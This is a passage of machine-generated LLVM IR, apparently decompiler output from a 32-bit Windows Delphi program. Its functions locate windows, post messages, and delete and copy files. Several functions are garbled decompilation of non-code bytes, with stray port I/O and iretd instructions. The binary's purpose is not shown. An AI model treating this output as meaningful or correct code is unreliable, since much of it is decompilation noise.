  br label %dec_label_pc_405b51, !insn.addr !1079

dec_label_pc_405b51:                              ; preds = %dec_label_pc_405b3d, %dec_label_pc_405b17
  %24 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1080
  call void @__writefsdword(i32 0, i32 %24), !insn.addr !1081
  ret i32 0, !insn.addr !1082
}

define i32 @function_405b5f() local_unnamed_addr {
dec_label_pc_405b5f:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1083
  ret i32 %0, !insn.addr !1083
}

define i32 @function_405b64() local_unnamed_addr {
dec_label_pc_405b64:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1084
}

define i32 @function_405b66(i32 %arg1) local_unnamed_addr {
dec_label_pc_405b66:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1085
}

define i32 @function_405b68() local_unnamed_addr {
dec_label_pc_405b68:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_40a6b4, align 4, !insn.addr !1086
  %2 = add i32 %1, -1, !insn.addr !1086
  store i32 %2, i32* @global_var_40a6b4, align 4, !insn.addr !1086
  ret i32 %0, !insn.addr !1087
}

define i32 @function_405b70() local_unnamed_addr {
dec_label_pc_405b70:
  %esp.0.reg2mem = alloca i32, !insn.addr !1088
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-104 = alloca i32, align 4
  %stack_var_-64 = alloca i8*, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-28 = alloca i8*, align 4
  %stack_var_-24 = alloca i32, align 4
  %1 = ptrtoint i32* %stack_var_-24 to i32, !insn.addr !1089
  %2 = icmp eq i32 %0, 0, !insn.addr !1090
  store i32 %1, i32* %esp.0.reg2mem, !insn.addr !1091
  br i1 %2, label %dec_label_pc_405c7a, label %dec_label_pc_405b8a, !insn.addr !1091

dec_label_pc_405b8a:                              ; preds = %dec_label_pc_405b70
  %3 = call i32 @function_4036c8(), !insn.addr !1092
  %4 = inttoptr i32 %3 to i8*, !insn.addr !1093
  store i8* %4, i8** %stack_var_-28, align 4, !insn.addr !1093
  %5 = ptrtoint i8** %stack_var_-28 to i32, !insn.addr !1093
  %6 = call i1 @PathFileExistsA(i8* %4), !insn.addr !1094
  %7 = icmp eq i1 %6, false, !insn.addr !1095
  store i32 %5, i32* %esp.0.reg2mem, !insn.addr !1096
  br i1 %7, label %dec_label_pc_405c7a, label %dec_label_pc_405ba5, !insn.addr !1096

dec_label_pc_405ba5:                              ; preds = %dec_label_pc_405b8a
  %8 = load i8*, i8** %stack_var_-28, align 4
  %9 = call i32* @FindWindowExA(i32* null, i32* bitcast ([7 x i8]* @global_var_405c88 to i32*), i8* null, i8* %8), !insn.addr !1097
  %10 = ptrtoint i32* %9 to i32, !insn.addr !1097
  store i32 %10, i32* %stack_var_-48, align 4, !insn.addr !1098
  %11 = ptrtoint i32* %stack_var_-48 to i32, !insn.addr !1098
  %12 = call i1 @IsWindow(i32* %9), !insn.addr !1099
  %13 = icmp eq i1 %12, false, !insn.addr !1100
  store i32 %11, i32* %esp.0.reg2mem, !insn.addr !1101
  br i1 %13, label %dec_label_pc_405c7a, label %dec_label_pc_405bce, !insn.addr !1101

dec_label_pc_405bce:                              ; preds = %dec_label_pc_405ba5
  %14 = call i32 @function_4034c8(), !insn.addr !1102
  %15 = add i32 %14, 22, !insn.addr !1103
  store i32 66, i32* %stack_var_-56, align 4, !insn.addr !1104
  %16 = ptrtoint i32* %stack_var_-56 to i32, !insn.addr !1104
  %17 = call i32* @GlobalAlloc(i32 %15, i32 66), !insn.addr !1105
  %18 = icmp eq i32* %17, null, !insn.addr !1106
  store i32 %16, i32* %esp.0.reg2mem, !insn.addr !1107
  br i1 %18, label %dec_label_pc_405c7a, label %dec_label_pc_405bed, !insn.addr !1107

dec_label_pc_405bed:                              ; preds = %dec_label_pc_405bce
  %19 = call i32* @GlobalLock(i32* nonnull %17), !insn.addr !1108
  %20 = icmp eq i32* %19, null, !insn.addr !1109
  %21 = icmp eq i1 %20, false, !insn.addr !1110
  br i1 %21, label %dec_label_pc_405c01, label %dec_label_pc_405bf9, !insn.addr !1110

dec_label_pc_405bf9:                              ; preds = %dec_label_pc_405bed
  %22 = bitcast i32* %17 to i8*, !insn.addr !1111
  store i8* %22, i8** %stack_var_-64, align 4, !insn.addr !1111
  %23 = ptrtoint i8** %stack_var_-64 to i32, !insn.addr !1111
  %24 = call i32* @GlobalFree(i32* nonnull %17), !insn.addr !1112
  store i32 %23, i32* %esp.0.reg2mem, !insn.addr !1113
  br label %dec_label_pc_405c7a, !insn.addr !1113

dec_label_pc_405c01:                              ; preds = %dec_label_pc_405bed
  %25 = ptrtoint i32* %17 to i32, !insn.addr !1105
  %26 = ptrtoint i32* %19 to i32, !insn.addr !1108
  store i32 20, i32* %19, align 4, !insn.addr !1114
  %27 = add i32 %26, 4, !insn.addr !1115
  %28 = inttoptr i32 %27 to i32*, !insn.addr !1115
  store i32 0, i32* %28, align 4, !insn.addr !1115
  %29 = add i32 %26, 8, !insn.addr !1116
  %30 = inttoptr i32 %29 to i32*, !insn.addr !1116
  store i32 0, i32* %30, align 4, !insn.addr !1116
  %31 = add i32 %26, 12, !insn.addr !1117
  %32 = inttoptr i32 %31 to i32*, !insn.addr !1117
  store i32 0, i32* %32, align 4, !insn.addr !1117
  %33 = add i32 %26, 16, !insn.addr !1118
  %34 = inttoptr i32 %33 to i32*, !insn.addr !1118
  store i32 0, i32* %34, align 4, !insn.addr !1118
  %35 = call i32 @function_4036c8(), !insn.addr !1119
  %36 = inttoptr i32 %35 to i8*, !insn.addr !1120
  store i8* %36, i8** %stack_var_-64, align 4, !insn.addr !1120
  %37 = add i32 %26, 20, !insn.addr !1121
  %38 = inttoptr i32 %37 to i8*, !insn.addr !1122
  %39 = call i8* @lstrcpyA(i8* %36, i8* %38), !insn.addr !1123
  %40 = call i1 @GlobalUnlock(i32* nonnull %17), !insn.addr !1124
  %41 = call i1 @PostMessageA(i32* null, i32 %25, i32 563, i32 %10), !insn.addr !1125
  %42 = call i32 @function_406f2c(i32 4218000, i32 2000, i32 -1), !insn.addr !1126
  store i32 %42, i32* %stack_var_-104, align 4, !insn.addr !1127
  %43 = ptrtoint i32* %stack_var_-104 to i32, !insn.addr !1127
  %44 = inttoptr i32 %42 to i32*, !insn.addr !1128
  %45 = call i1 @IsWindow(i32* %44), !insn.addr !1128
  %46 = icmp eq i1 %45, false, !insn.addr !1129
  store i32 %43, i32* %esp.0.reg2mem, !insn.addr !1130
  br i1 %46, label %dec_label_pc_405c7a, label %dec_label_pc_405c6b, !insn.addr !1130

dec_label_pc_405c6b:                              ; preds = %dec_label_pc_405c01
  store i32 %42, i32* %stack_var_-120, align 4, !insn.addr !1131
  %47 = ptrtoint i32* %stack_var_-120 to i32, !insn.addr !1131
  %48 = call i32 @SendMessageA(i32* null, i32 0, i32 245, i32 %42), !insn.addr !1132
  store i32 %47, i32* %esp.0.reg2mem, !insn.addr !1132
  br label %dec_label_pc_405c7a, !insn.addr !1132

dec_label_pc_405c7a:                              ; preds = %dec_label_pc_405c6b, %dec_label_pc_405c01, %dec_label_pc_405bf9, %dec_label_pc_405bce, %dec_label_pc_405ba5, %dec_label_pc_405b8a, %dec_label_pc_405b70
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %49 = add i32 %esp.0.reload, 4, !insn.addr !1133
  %50 = inttoptr i32 %49 to i32*, !insn.addr !1133
  %51 = load i32, i32* %50, align 4, !insn.addr !1133
  ret i32 %51, !insn.addr !1134
}

define i32 @function_405c85(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
dec_label_pc_405c85:
  %ebp.0.reg2mem = alloca i32, !insn.addr !1135
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %ebx = alloca i32, align 4
  %3 = call i32 @__decompiler_undefined_function_0()
  %4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %5 = trunc i32 %4 to i8
  %6 = mul i8 %5, 2, !insn.addr !1135
  %7 = inttoptr i32 %4 to i8*, !insn.addr !1135
  store i8 %6, i8* %7, align 1, !insn.addr !1135
  %8 = bitcast i32* %ebx to i8*
  %9 = load i8, i8* %8, align 4, !insn.addr !1136
  %10 = udiv i32 %4, 256, !insn.addr !1136
  %11 = trunc i32 %10 to i8, !insn.addr !1136
  %12 = add i8 %9, %11, !insn.addr !1136
  %13 = load i32, i32* %ebx, align 4, !insn.addr !1136
  %14 = inttoptr i32 %13 to i8*, !insn.addr !1136
  store i8 %12, i8* %14, align 1, !insn.addr !1136
  %15 = and i32 %4, 14
  %16 = icmp ugt i32 %15, 9, !insn.addr !1137
  %17 = add i32 %4, 6, !insn.addr !1137
  %18 = select i1 %16, i32 %17, i32 %4, !insn.addr !1137
  %19 = zext i1 %16 to i32, !insn.addr !1137
  %20 = and i32 %4, -65536, !insn.addr !1137
  %21 = and i32 %18, 14
  %22 = icmp ugt i32 %21, 9, !insn.addr !1138
  %23 = or i1 %16, %22, !insn.addr !1138
  %24 = add i32 %18, 6, !insn.addr !1138
  %25 = select i1 %23, i32 %24, i32 %18, !insn.addr !1138
  %26 = zext i1 %23 to i32, !insn.addr !1138
  %27 = and i32 %25, 15, !insn.addr !1138
  %28 = or i32 %27, %20, !insn.addr !1138
  %reass.add = add nuw nsw i32 %26, %19
  %reass.mul = mul i32 %reass.add, 256
  %29 = add i32 %reass.mul, %4
  %30 = and i32 %29, 65280, !insn.addr !1138
  %31 = or i32 %28, %30, !insn.addr !1138
  %32 = inttoptr i32 %31 to i8*, !insn.addr !1139
  %33 = load i8, i8* %32, align 1, !insn.addr !1139
  %34 = trunc i32 %27 to i8, !insn.addr !1139
  %35 = xor i8 %33, %34, !insn.addr !1139
  store i8 %35, i8* %32, align 1, !insn.addr !1139
  %36 = add i32 %0, 1311123697, !insn.addr !1140
  %37 = inttoptr i32 %36 to i8*, !insn.addr !1140
  %38 = load i8, i8* %37, align 1, !insn.addr !1140
  %39 = udiv i32 %3, 256, !insn.addr !1140
  %40 = trunc i32 %39 to i8, !insn.addr !1140
  %41 = add i8 %38, %40, !insn.addr !1140
  store i8 %41, i8* %37, align 1, !insn.addr !1140
  %42 = inttoptr i32 %31 to i32*, !insn.addr !1141
  %43 = load i32, i32* %42, align 4, !insn.addr !1141
  %44 = sub i32 %43, %31, !insn.addr !1141
  store i32 %44, i32* %42, align 4, !insn.addr !1141
  %45 = add i32 %3, 117, !insn.addr !1142
  %46 = inttoptr i32 %45 to i8*, !insn.addr !1142
  %47 = load i8, i8* %46, align 1, !insn.addr !1142
  %48 = add i8 %47, %34, !insn.addr !1142
  %49 = icmp eq i8 %48, 0, !insn.addr !1142
  store i8 %48, i8* %46, align 1, !insn.addr !1142
  br i1 %49, label %dec_label_pc_405d10, label %dec_label_pc_405c9c, !insn.addr !1143

dec_label_pc_405c9c:                              ; preds = %dec_label_pc_405c85
  %50 = xor i32 %3, %1, !insn.addr !1144
  %51 = trunc i32 %3 to i16, !insn.addr !1145
  %52 = inttoptr i32 %50 to i32*, !insn.addr !1145
  %53 = load i32, i32* %52, align 4, !insn.addr !1145
  call void @__asm_outsd(i16 %51, i32 %53), !insn.addr !1145
  %54 = inttoptr i32 %50 to i8*, !insn.addr !1146
  %55 = load i8, i8* %54, align 1, !insn.addr !1146
  call void @__asm_outsb(i16 %51, i8 %55), !insn.addr !1146
  %56 = load i8, i8* %32, align 1, !insn.addr !1147
  %57 = add i8 %56, %34, !insn.addr !1147
  store i8 %57, i8* %32, align 1, !insn.addr !1147
  %58 = call i32 @__asm_iretd(), !insn.addr !1148
  %59 = add i32 %2, -117, !insn.addr !1149
  %60 = inttoptr i32 %59 to i8*, !insn.addr !1149
  %61 = load i8, i8* %60, align 1, !insn.addr !1149
  %62 = add i8 %61, -69, !insn.addr !1149
  store i8 %62, i8* %60, align 1, !insn.addr !1149
  %63 = call i8 @__asm_in(i16 -11077), !insn.addr !1150
  %64 = call i32 @__readfsdword(i32 0), !insn.addr !1151
  store i32 %64, i32* %stack_var_-12, align 4, !insn.addr !1151
  %65 = ptrtoint i32* %stack_var_-12 to i32, !insn.addr !1151
  call void @__writefsdword(i32 0, i32 %65), !insn.addr !1152
  %66 = load i32, i32* @global_var_40a6bc, align 4, !insn.addr !1153
  %67 = add i32 %66, 1, !insn.addr !1153
  store i32 %67, i32* @global_var_40a6bc, align 4, !insn.addr !1153
  %68 = load i32, i32* %stack_var_-12, align 4, !insn.addr !1154
  call void @__writefsdword(i32 0, i32 %68), !insn.addr !1155
  ret i32 0, !insn.addr !1156

dec_label_pc_405d10:                              ; preds = %dec_label_pc_405c85
  %69 = call i32 @function_403c90(), !insn.addr !1157
  store i32 %69, i32* %ebx, align 4, !insn.addr !1158
  %70 = icmp slt i32 %69, 0, !insn.addr !1159
  br i1 %70, label %dec_label_pc_405d38, label %dec_label_pc_405d20, !insn.addr !1160

dec_label_pc_405d20:                              ; preds = %dec_label_pc_405d10
  %71 = add i32 %69, 1, !insn.addr !1161
  store i32 %71, i32* %ebx, align 4, !insn.addr !1161
  %72 = call i32 @"@LStrCmp"(), !insn.addr !1162
  br label %dec_label_pc_405d79

dec_label_pc_405d38:                              ; preds = %dec_label_pc_405d10
  %73 = call i32 @function_403c88(), !insn.addr !1163
  %74 = call i32 @"@DynArraySetLength"(), !insn.addr !1164
  %75 = call i32 @function_403c90(), !insn.addr !1165
  %76 = call i32 @"@LStrAsg"(), !insn.addr !1166
  store i32 -1, i32* %ebp.0.reg2mem, !insn.addr !1167
  br label %dec_label_pc_405d79, !insn.addr !1167

dec_label_pc_405d79:                              ; preds = %dec_label_pc_405d20, %dec_label_pc_405d38
  %ebp.0.reload = load i32, i32* %ebp.0.reg2mem
  ret i32 %ebp.0.reload, !insn.addr !1168
}

define i32 @function_405d80() local_unnamed_addr {
dec_label_pc_405d80:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1169
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !1169
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1169
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1170
  %2 = load i32, i32* @global_var_40a6c0, align 4, !insn.addr !1171
  %3 = add i32 %2, 1, !insn.addr !1171
  %4 = icmp eq i32 %3, 0, !insn.addr !1171
  store i32 %3, i32* @global_var_40a6c0, align 4, !insn.addr !1171
  %5 = icmp eq i1 %4, false, !insn.addr !1172
  br i1 %5, label %dec_label_pc_405da9, label %dec_label_pc_405d99, !insn.addr !1172

dec_label_pc_405d99:                              ; preds = %dec_label_pc_405d80
  %6 = call i32 @"@DynArrayClear"(), !insn.addr !1173
  br label %dec_label_pc_405da9, !insn.addr !1173

dec_label_pc_405da9:                              ; preds = %dec_label_pc_405d99, %dec_label_pc_405d80
  %7 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1174
  call void @__writefsdword(i32 0, i32 %7), !insn.addr !1175
  ret i32 0, !insn.addr !1176
}

define i32 @function_405db7() local_unnamed_addr {
dec_label_pc_405db7:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1177
  ret i32 %0, !insn.addr !1177
}

define i32 @function_405dbc() local_unnamed_addr {
dec_label_pc_405dbc:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1178
}

define i32 @function_405dbe(i32 %arg1) local_unnamed_addr {
dec_label_pc_405dbe:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1179
}

define i32 @function_405dc0() local_unnamed_addr {
dec_label_pc_405dc0:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1180
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !1180
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1180
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1181
  %2 = load i32, i32* @global_var_40a6c0, align 4, !insn.addr !1182
  %3 = add i32 %2, -1, !insn.addr !1182
  %4 = icmp eq i32 %2, 0, !insn.addr !1182
  store i32 %3, i32* @global_var_40a6c0, align 4, !insn.addr !1182
  %5 = icmp eq i1 %4, false, !insn.addr !1183
  br i1 %5, label %dec_label_pc_405df4, label %dec_label_pc_405dda, !insn.addr !1183

dec_label_pc_405dda:                              ; preds = %dec_label_pc_405dc0
  %6 = call i32 @"@DynArraySetLength"(), !insn.addr !1184
  br label %dec_label_pc_405df4, !insn.addr !1185

dec_label_pc_405df4:                              ; preds = %dec_label_pc_405dda, %dec_label_pc_405dc0
  %7 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1186
  call void @__writefsdword(i32 0, i32 %7), !insn.addr !1187
  ret i32 0, !insn.addr !1188
}

define i32 @function_405e02() local_unnamed_addr {
dec_label_pc_405e02:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1189
  ret i32 %0, !insn.addr !1189
}

define i32 @function_405e07() local_unnamed_addr {
dec_label_pc_405e07:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1190
}

define i32 @function_405e09(i32 %arg1) local_unnamed_addr {
dec_label_pc_405e09:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1191
}

define i32 @function_405e0c(i32 %arg1) local_unnamed_addr {
dec_label_pc_405e0c:
  %esp.0.reg2mem = alloca i32, !insn.addr !1192
  %of.0.reg2mem = alloca i1, !insn.addr !1192
  %.reg2mem6 = alloca i8, !insn.addr !1192
  %.reg2mem = alloca i32, !insn.addr !1192
  %esi = alloca i32, align 4
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %4 = call i32 @__decompiler_undefined_function_0()
  %5 = call i1 @__decompiler_undefined_function_1()
  %6 = call i1 @__decompiler_undefined_function_1()
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-20 = alloca i8*, align 4
  %stack_var_-4 = alloca i32, align 4
  call void @__asm_into(i32 %4), !insn.addr !1192
  %7 = trunc i32 %2 to i8, !insn.addr !1193
  %8 = and i8 %7, 31, !insn.addr !1193
  %9 = icmp eq i8 %8, 0, !insn.addr !1193
  br i1 %9, label %dec_label_pc_405e0c._crit_edge, label %11, !insn.addr !1193

dec_label_pc_405e0c._crit_edge:                   ; preds = %dec_label_pc_405e0c
  %10 = trunc i32 %0 to i8
  store i8 %10, i8* %.reg2mem6
  br label %21

; <label>:11:                                     ; preds = %dec_label_pc_405e0c
  %12 = add i32 %1, -959064636, !insn.addr !1193
  %13 = inttoptr i32 %12 to i8*, !insn.addr !1193
  %14 = load i8, i8* %13, align 1, !insn.addr !1193
  %15 = shl i8 %14, %8, !insn.addr !1193
  store i8 %15, i8* %13, align 1, !insn.addr !1193
  %16 = add nsw i8 %8, -1, !insn.addr !1193
  %17 = shl i8 %14, %16, !insn.addr !1193
  %.unshifted = xor i8 %15, %17
  %18 = icmp slt i8 %.unshifted, 0, !insn.addr !1193
  %19 = icmp eq i8 %8, 1, !insn.addr !1193
  %20 = select i1 %19, i1 %18, i1 %5, !insn.addr !1193
  %.phi.trans.insert = bitcast i32* %esi to i8*
  %.pre = load i8, i8* %.phi.trans.insert, align 4
  %.pre4 = load i32, i32* %esi, align 4
  store i32 %.pre4, i32* %.reg2mem, !insn.addr !1193
  store i8 %.pre, i8* %.reg2mem6, !insn.addr !1193
  store i1 %20, i1* %of.0.reg2mem, !insn.addr !1193
  br label %21, !insn.addr !1193

; <label>:21:                                     ; preds = %dec_label_pc_405e0c._crit_edge, %11
  %of.0.reload = load i1, i1* %of.0.reg2mem
  %.reload7 = load i8, i8* %.reg2mem6, !insn.addr !1194
  %.reload = load i32, i32* %.reg2mem, !insn.addr !1194
  %22 = zext i8 %.reload7 to i32, !insn.addr !1194
  %23 = and i32 %3, -256, !insn.addr !1194
  %24 = or i32 %23, %22, !insn.addr !1194
  %25 = select i1 %6, i32 -1, i32 1, !insn.addr !1194
  %26 = add i32 %.reload, %25, !insn.addr !1194
  store i32 %26, i32* %esi, align 4, !insn.addr !1194
  %27 = inttoptr i32 %24 to i8*
  %28 = load i8, i8* %27, align 1
  %29 = add i8 %28, %.reload7
  br i1 %of.0.reload, label %dec_label_pc_405e80, label %dec_label_pc_405e17, !insn.addr !1195

dec_label_pc_405e17:                              ; preds = %21
  %factor = mul i8 %.reload7, 27
  %30 = add i8 %29, %factor, !insn.addr !1196
  store i8 %30, i8* %27, align 1, !insn.addr !1196
  store i8* null, i8** %stack_var_-20, align 4, !insn.addr !1197
  %31 = call i32 @__readfsdword(i32 0), !insn.addr !1198
  store i32 %31, i32* %stack_var_-48, align 4, !insn.addr !1198
  %32 = ptrtoint i32* %stack_var_-48 to i32, !insn.addr !1198
  call void @__writefsdword(i32 0, i32 %32), !insn.addr !1199
  %33 = call i32 @GetClassLongA(i32* inttoptr (i32 -1 to i32*), i32 ptrtoint (i32* @0 to i32)), !insn.addr !1200
  ret i32 %33, !insn.addr !1200

dec_label_pc_405e80:                              ; preds = %21
  %34 = icmp eq i8 %29, 0, !insn.addr !1201
  store i8 %29, i8* %27, align 1, !insn.addr !1201
  %35 = icmp eq i1 %34, false, !insn.addr !1202
  br i1 %35, label %dec_label_pc_405f34, label %dec_label_pc_405e88, !insn.addr !1202

dec_label_pc_405e88:                              ; preds = %dec_label_pc_405e80
  %36 = call i32 @function_407020(), !insn.addr !1203
  %37 = call i32 @"@LStrPos"(), !insn.addr !1204
  %38 = call i32 @"@LStrPos"(), !insn.addr !1205
  %39 = add i32 %38, -1, !insn.addr !1206
  %40 = icmp slt i32 %39, 0, !insn.addr !1207
  %41 = add i32 %37, 2, !insn.addr !1208
  %42 = icmp sgt i32 %41, %39, !insn.addr !1209
  %or.cond = or i1 %40, %42
  br i1 %or.cond, label %dec_label_pc_405f34, label %dec_label_pc_405ebc, !insn.addr !1210

dec_label_pc_405ebc:                              ; preds = %dec_label_pc_405e88
  %43 = add i32 %1, -12, !insn.addr !1211
  store i32 %43, i32* %stack_var_-4, align 4, !insn.addr !1212
  %44 = ptrtoint i32* %stack_var_-4 to i32, !insn.addr !1212
  %45 = call i32 @"@LStrCopy"(), !insn.addr !1213
  %46 = inttoptr i32 %43 to i32*, !insn.addr !1214
  %47 = load i32, i32* %46, align 4, !insn.addr !1214
  %48 = icmp eq i32 %47, 0, !insn.addr !1214
  store i32 %44, i32* %esp.0.reg2mem, !insn.addr !1215
  br i1 %48, label %dec_label_pc_405f34, label %dec_label_pc_405ee4, !insn.addr !1215

dec_label_pc_405ee4:                              ; preds = %dec_label_pc_405ebc
  %49 = call i32 @function_406e08(), !insn.addr !1216
  %50 = call i32 @"@LStrFromPChar"(), !insn.addr !1217
  %51 = call i32 @"@LStrCat"(), !insn.addr !1218
  %52 = call i32 @function_4036c8(), !insn.addr !1219
  %53 = inttoptr i32 %52 to i8*, !insn.addr !1220
  %54 = call i1 @DeleteFileA(i8* %53), !insn.addr !1221
  %55 = call i32 @function_4036c8(), !insn.addr !1222
  %56 = inttoptr i32 %55 to i8*, !insn.addr !1223
  store i8* %56, i8** %stack_var_-20, align 4, !insn.addr !1223
  %57 = ptrtoint i8** %stack_var_-20 to i32, !insn.addr !1223
  %58 = call i1 @CopyFileA(i8* %56, i8* bitcast (i32* @0 to i8*), i1 ptrtoint (i32* @0 to i1)), !insn.addr !1224
  %59 = call i32 @function_405b70(), !insn.addr !1225
  store i32 %57, i32* %esp.0.reg2mem, !insn.addr !1225
  br label %dec_label_pc_405f34, !insn.addr !1225

dec_label_pc_405f34:                              ; preds = %dec_label_pc_405ee4, %dec_label_pc_405ebc, %dec_label_pc_405e88, %dec_label_pc_405e80
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %60 = inttoptr i32 %esp.0.reload to i32*, !insn.addr !1226
  %61 = load i32, i32* %60, align 4, !insn.addr !1226
  call void @__writefsdword(i32 0, i32 %61), !insn.addr !1227
  %62 = add i32 %esp.0.reload, 8, !insn.addr !1228
  %63 = inttoptr i32 %62 to i32*, !insn.addr !1228
  store i32 4218710, i32* %63, align 4, !insn.addr !1228
  %64 = call i32 @"@LStrArrayClr"(), !insn.addr !1229
  ret i32 %64, !insn.addr !1230
}

define i32 @function_405f4f() local_unnamed_addr {
dec_label_pc_405f4f:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1231
  ret i32 %0, !insn.addr !1231
}

define i32 @function_405f54() local_unnamed_addr {
dec_label_pc_405f54:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1232
}

define i32 @function_405f56(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_405f56:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = add i32 %0, -4, !insn.addr !1233
  %2 = inttoptr i32 %1 to i32*, !insn.addr !1233
  %3 = load i32, i32* %2, align 4, !insn.addr !1233
  ret i32 %3, !insn.addr !1234
}

define i32 @function_405f67() local_unnamed_addr {
dec_label_pc_405f67:
  %0 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %1 = add i32 %0, 1, !insn.addr !1235
  %2 = inttoptr i32 %0 to i32*, !insn.addr !1235
  store i32 %1, i32* %2, align 4, !insn.addr !1235
  %3 = bitcast i32* %eax to i8*
  %4 = load i8, i8* %3, align 4, !insn.addr !1236
  %5 = load i32, i32* %eax, align 4
  %6 = trunc i32 %5 to i8, !insn.addr !1236
  %7 = add i8 %4, %6, !insn.addr !1236
  %8 = inttoptr i32 %5 to i8*, !insn.addr !1236
  store i8 %7, i8* %8, align 1, !insn.addr !1236
  %9 = load i32, i32* %eax, align 4, !insn.addr !1237
  ret i32 %9, !insn.addr !1237
}

define i32 @function_405f76() local_unnamed_addr {
dec_label_pc_405f76:
  %0 = call i32 @__decompiler_undefined_function_0()
  %edx = alloca i32, align 4
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = trunc i32 %2 to i8
  %4 = mul i8 %3, 2, !insn.addr !1238
  %5 = inttoptr i32 %2 to i8*, !insn.addr !1238
  store i8 %4, i8* %5, align 1, !insn.addr !1238
  %6 = mul i32 %0, 4096, !insn.addr !1239
  %7 = udiv i32 %0, 1048576, !insn.addr !1239
  %8 = or i32 %7, %6, !insn.addr !1239
  %9 = and i32 %0, 1048576, !insn.addr !1239
  %10 = icmp eq i32 %9, 0, !insn.addr !1239
  %11 = load i32, i32* %edx, align 4, !insn.addr !1240
  %12 = trunc i32 %11 to i16, !insn.addr !1240
  %13 = call i8 @__asm_in(i16 %12), !insn.addr !1240
  %14 = sext i8 %13 to i32, !insn.addr !1240
  %15 = or i32 %2, %14, !insn.addr !1240
  %16 = select i1 %10, i32 0, i32 255, !insn.addr !1241
  %17 = and i32 %15, -256, !insn.addr !1241
  %18 = or i32 %17, %16, !insn.addr !1241
  %19 = inttoptr i32 %18 to i8*, !insn.addr !1242
  %20 = load i8, i8* %19, align 1, !insn.addr !1242
  %21 = mul i8 %20, 2, !insn.addr !1242
  %22 = lshr i8 %20, 7, !insn.addr !1242
  %23 = or i8 %22, %21, !insn.addr !1242
  store i8 %23, i8* %19, align 1, !insn.addr !1242
  %24 = bitcast i32* %edx to i8*
  %25 = load i8, i8* %24, align 4, !insn.addr !1243
  %26 = udiv i32 %1, 256, !insn.addr !1243
  %27 = trunc i32 %26 to i8, !insn.addr !1243
  %28 = add i8 %25, %27, !insn.addr !1243
  %29 = load i32, i32* %edx, align 4, !insn.addr !1243
  %30 = inttoptr i32 %29 to i8*, !insn.addr !1243
  store i8 %28, i8* %30, align 1, !insn.addr !1243
  %31 = add i32 %8, -4, !insn.addr !1244
  %32 = inttoptr i32 %31 to i32*, !insn.addr !1244
  store i32 4218448, i32* %32, align 4, !insn.addr !1244
  %33 = call i1 @EnumWindows(i1 (i32*, i32)* bitcast (i32* @0 to i1 (i32*, i32)*), i32 ptrtoint (i32* @0 to i32)), !insn.addr !1245
  %34 = sext i1 %33 to i32, !insn.addr !1245
  ret i32 %34, !insn.addr !1246
}

define i32 @function_405f80(i32 %arg1) local_unnamed_addr {
dec_label_pc_405f80:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0
}

define i32 @function_405f90() local_unnamed_addr {
dec_label_pc_405f90:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1247
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !1247
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1247
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1248
  %2 = load i32, i32* @global_var_40a6c8, align 4, !insn.addr !1249
  %3 = add i32 %2, 1, !insn.addr !1249
  store i32 %3, i32* @global_var_40a6c8, align 4, !insn.addr !1249
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1250
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !1251
  ret i32 0, !insn.addr !1252
}

define i32 @function_405fb5() local_unnamed_addr {
dec_label_pc_405fb5:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1253
  ret i32 %0, !insn.addr !1253
}

define i32 @function_405fba() local_unnamed_addr {
dec_label_pc_405fba:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1254
}

